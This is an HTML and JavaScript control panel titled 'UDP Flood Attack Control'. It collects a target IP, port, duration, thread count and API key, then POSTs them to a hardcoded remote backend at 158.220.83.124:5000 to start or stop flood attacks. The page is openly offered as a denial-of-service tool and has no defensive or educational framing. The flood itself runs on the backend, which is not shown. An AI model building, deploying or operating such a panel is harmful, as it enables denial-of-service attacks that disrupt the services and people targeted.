<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>UDP Flood Control</title>
    <style>
        /* Provided CSS */
        body {
            background: black;
            color: #39ff14;
            font-family: 'Courier New', monospace;
            margin: 0;
            padding: 0;
        }
        .container {
            max-width: 600px;
            margin: 40px auto;
            padding: 20px;
            border: 2px solid #39ff14;
            border-radius: 20px;
            background: rgba(0, 0, 0, 0.9);
            box-shadow: 0 0 20px #39ff14;
            text-align: center;
        }
        .header {
            margin-bottom: 30px;
        }
        .profile-pic {
            width: 80px;
            height: 80px;
            border-radius: 50%;
            border: 2px solid #39ff14;
            margin-bottom: 10px;
        }
        .bounce {
            animation: bounce 2s infinite;
        }
        @keyframes bounce {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-15px); }
        }
        .tabs button {
            margin: 0 10px;
            padding: 10px 20px;
            background: transparent;
            color: #39ff14;
            border: 1px solid #39ff14;
            border-radius: 5px;
            cursor: pointer;
            transition: 0.3s;
        }
        .tabs button:hover {
            background-color: #39ff14;
            color: black;
            transform: scale(1.1);
        }
        input, button {
            width: 100%;
            margin: 10px 0;
            padding: 10px;
            background: #000;
            color: #39ff14;
            border: 1px solid #39ff14;
            border-radius: 5px;
            transition: 0.3s;
        }
        input:focus, button:hover {
            border-color: #00ffcc;
            box-shadow: 0 0 5px #00ffcc;
        }
        .panel {
            animation: fadeSlideIn 0.5s ease;
        }
        @keyframes fadeSlideIn {
            from { opacity: 0; transform: translateY(30px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .log-box {
            padding: 15px;
            background: #111;
            border: 1px dashed #39ff14;
            border-radius: 10px;
            min-height: 80px;
        }
        .typing {
            overflow: hidden;
            white-space: nowrap;
            border-right: 2px solid #39ff14;
            animation: typing 3s steps(30) infinite alternate;
        }
        @keyframes typing {
            from { width: 0 }
            to { width: 100% }
        }
        .watermark {
            margin-top: 30px;
            text-align: center;
            font-size: 14px;
            color: #39ff14;
            animation: fadeIn 2s ease;
        }
        .watermark a {
            text-decoration: none;
            color: #39ff14;
            font-weight: bold;
            transition: color 0.3s, transform 0.3s;
        }
        .watermark a:hover {
            color: #00ffe1;
            transform: scale(1.05);
        }
        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }

    </style>
</head>
<body>

    <div class="container">
        <div class="header">
            <h1 class="bounce">UDP Flood Attack Control</h1>
            <img src="profile-pic.jpg" alt="Profile Picture" class="profile-pic">
        </div>

        <!-- Form for attack parameters -->
        <div class="input-group">
            <label for="ip">Target IP:</label>
            <input type="text" id="ip" placeholder="Enter IP Address">
        </div>
        <div class="input-group">
            <label for="port">Port:</label>
            <input type="text" id="port" placeholder="Enter Port">
        </div>
        <div class="input-group">
            <label for="time">Duration (Seconds):</label>
            <input type="text" id="time" placeholder="Enter Time">
        </div>
        <div class="input-group">
            <label for="threads">Threads:</label>
            <input type="text" id="threads" placeholder="Enter Threads">
        </div>
        <div class="input-group">
            <label for="apikey">API Key:</label>
            <input type="text" id="apikey" placeholder="Enter API Key">
        </div>

        <!-- Button to start the attack -->
        <button onclick="startAttack()">Start Attack</button>

        <!-- Input field to stop the attack -->
        <div class="input-group">
            <label for="attack-id">Attack ID (to stop):</label>
            <input type="text" id="attack-id" placeholder="Enter Attack ID to stop">
        </div>
        <button onclick="stopAttack()">Stop Attack</button>

        <!-- Loading message while the attack is running -->
        <div id="loading-message" class="typing">Starting Attack...</div>

        <!-- Response message -->
        <div id="response-message"></div>

        <!-- Watermark -->
        <div class="watermark">
            <p>Powered by <a href="https://github.com">GitHub</a></p>
        </div>
    </div>

    <script>
        // Function to start the attack
        function startAttack() {
            // Getting values from input fields
            const ip = document.getElementById('ip').value;
            const port = document.getElementById('port').value;
            const time = document.getElementById('time').value;
            const threads = document.getElementById('threads').value;
            const apikey = document.getElementById('apikey').value;

            // Basic validation to check if all fields are filled
            if (!ip || !port || !time || !threads || !apikey) {
                alert("Please fill in all the fields!");
                return;
            }

            // Constructing the data object
            const data = {
                ip: ip,
                port: port,
                time: time,
                threads: threads,
                apikey: apikey
            };

            // Display a loading indicator
            const loadingMessage = document.getElementById('loading-message');
            loadingMessage.style.display = 'block';

            // Sending the data to the backend's /start endpoint
            fetch('http://158.220.83.124:5000/start', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(data)  // Sending the parameters as a JSON object
            })
            .then(response => response.json())
            .then(responseData => {
                loadingMessage.style.display = 'none';  // Hide the loading message
                const responseMessage = document.getElementById('response-message');
                if (responseData.status === 'started') {
                    responseMessage.innerText = "Attack started successfully! Attack ID: " + responseData.attack_id;
                } else {
                    responseMessage.innerText = "Error starting attack: " + responseData.error;
                }
            })
            .catch(error => {
                loadingMessage.style.display = 'none';  // Hide the loading message
                console.error("Error:", error);
                alert("An error occurred while starting the attack.");
            });
        }

        // Function to stop the attack
        function stopAttack() {
            const attackId = document.getElementById('attack-id').value;

            if (!attackId) {
                alert("Please enter a valid Attack ID!");
                return;
            }

            // Sending the attack ID to stop the attack
            fetch('http://158.220.83.124:5000/stop', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ attack_id: attackId })  // Sending the attack ID
            })
            .then(response => response.json())
            .then(responseData => {
                const responseMessage = document.getElementById('response-message');
                if (responseData.status) {
                    responseMessage.innerText = "Attack stopped successfully: " + responseData.status;
                } else {
                    responseMessage.innerText = "Error stopping attack: " + responseData.error;
                }
            })
            .catch(error => {
                console.error("Error:", error);
                alert("An error occurred while stopping the attack.");
            });
        }
    </script>
</body>
</html>
